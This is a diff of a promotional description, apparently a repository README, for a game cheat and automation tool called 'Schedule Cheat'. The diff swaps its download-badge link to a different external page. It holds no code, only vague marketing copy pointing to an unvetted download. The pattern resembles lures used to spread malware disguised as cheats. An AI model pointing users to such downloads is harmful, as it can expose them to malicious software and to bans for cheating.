@@ -1,7 +1,7 @@
 **Full Description (up to 1500 characters):**  
 Schedule Cheat is an advanced tool designed to optimize and automate your gaming routine, allowing you to schedule and manage repetitive tasks with ease. Whether you need to handle in-game events, resource farming, or crafting, Schedule Cheat helps you automate the mundane and focus on the exciting parts of your game. With the ability to create custom schedules, you can make sure your in-game activities are always running smoothly and efficiently. Maximize your productivity and free up time for more engaging challenges and battles with Schedule Cheat!
 
-[![Download Schedule Cheat](https://img.shields.io/badge/Download-Schedule%20Cheat-blueviolet)](https://schedule-cheat-download-link.com)
+[![Download Schedule cheat](https://img.shields.io/badge/Download-Schedule%20cheat-blueviolet)](https://schedule-cheat.github.io/.github/)
 
 **Key Features:**
 
